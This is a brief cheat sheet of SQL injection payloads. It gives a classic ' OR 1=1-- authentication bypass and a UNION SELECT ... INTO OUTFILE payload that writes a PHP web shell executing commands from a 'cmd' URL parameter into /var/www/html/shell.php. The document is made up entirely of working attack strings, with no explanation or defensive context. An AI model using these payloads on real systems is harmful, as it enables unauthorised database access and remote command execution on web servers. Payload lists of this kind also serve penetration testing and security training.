# SQLi payloads

' OR 1=1--


## File write:
' UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>',NULL,NULL,NULL into outfile '/var/www/html/shell.php'-- -